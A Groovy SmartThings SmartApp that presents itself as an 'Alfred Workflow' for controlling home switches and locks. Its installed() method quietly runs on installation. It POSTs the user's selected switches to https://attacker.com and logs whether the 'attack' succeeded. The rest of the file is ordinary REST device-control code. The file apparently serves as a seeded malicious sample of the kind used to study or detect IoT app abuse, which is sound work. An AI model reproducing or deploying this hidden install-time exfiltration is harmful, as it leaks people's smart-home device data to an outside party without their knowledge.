

definition(
    name:"Alfred Workflow",
    namespace:"vlaminck",
    author:"SmartThings",
    description:"This SmartApp allows you to interact with the things in your physical graph through Alfred.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/alfred-app.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/alfred-app@2 x.png",
    oauth:[displayName:"SmartThings Alfred Workflow",displayLink:""],
    usesThirdPartyAuthentication:true,
    pausable:false
)

preferences{
    section("Allow Alfred to Control These Things..."){
        input"switches","capability.switch",title:"Which Switches?",multiple:true,required:false
        input"locks","capability.lock",title:"Which Locks?",multiple:true,required:false
        }
}

mappings{
    path("/switches"){
        action:[
        GET:"listSwitches",
        PUT:"updateSwitches"
        ]
        }
    path("/switches/:id"){
        action:[
        GET:"showSwitch",
        PUT:"updateSwitch"
        ]
        }
    path("/locks"){
        action:[
        GET:"listLocks",
        PUT:"updateLocks"
        ]
        }
    path("/locks/:id"){
        action:[
        GET:"showLock",
        PUT:"updateLock"
        ]
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${switches}"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hello"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }}

def updated(){}

def listSwitches(){
    switches.collect{device(it,"switch")}
}
void updateSwitches(){
    updateAll(switches)
}
def showSwitch(){
    show(switches,"switch")
}
void updateSwitch(){
    update(switches)
}

def listLocks(){
    locks.collect{device(it,"lock")}
}
void updateLocks(){
    updateAll(locks)
}
def showLock(){
    show(locks,"lock")
}
void updateLock(){
    update(locks)
}

private void updateAll(devices){
    def command=request.JSON?.command
    def type=params.param1
    if(!devices){
        httpError(404,"Devices not found")
    }
    
    if(command){
        devices.each{device->
            executeCommand(device,type,command)
            }
    }
}

private void update(devices){
    log.debug"update,request:${request.JSON},params:${params},devices:$devices.id"
    def command=request.JSON?.command
    def type=params.param1
    def device=devices?.find{it.id==params.id}
    
    if(!device){
        httpError(404,"Device not found")
    }
    
    if(command){
        executeCommand(device,type,command)
    }
}


def validateCommand(device,deviceType,command){
    def capabilityCommands=getDeviceCapabilityCommands(device.capabilities)
    def currentDeviceCapability=getCapabilityName(deviceType)
    if(capabilityCommands[currentDeviceCapability]){
        return command in capabilityCommands[currentDeviceCapability]?true:false
    }else{
            
            httpError(400,"Bad request.")
        }
}


def getCapabilityName(type){
    switch(type){
        case"switches":
            return"Switch"
            case"locks":
            return"Lock"
            default:
            return type
            }
}


def getDeviceCapabilityCommands(deviceCapabilities){
    def map=[:]
    deviceCapabilities.collect{
        map[it.name]=it.commands.collect{it.name.toString()}
        }
    return map
}


def executeCommand(device,type,command){
    if(validateCommand(device,type,command)){
        device."$command"()
    }else{
            httpError(403,"Access denied.This command is not supported by current capability.")
        }
}

private show(devices,name){
    def device=devices.find{it.id==params.id}
    if(!device){
        httpError(404,"Device not found")
    }
    else{
            def s=device.currentState(name)
            [id:device.id,label:device.displayName,name:device.displayName,state:s]
        }
}

private device(it,name){
    if(it){
        def s=it.currentState(name)
        [id:it.id,label:it.displayName,name:it.displayName,state:s]
    }
}

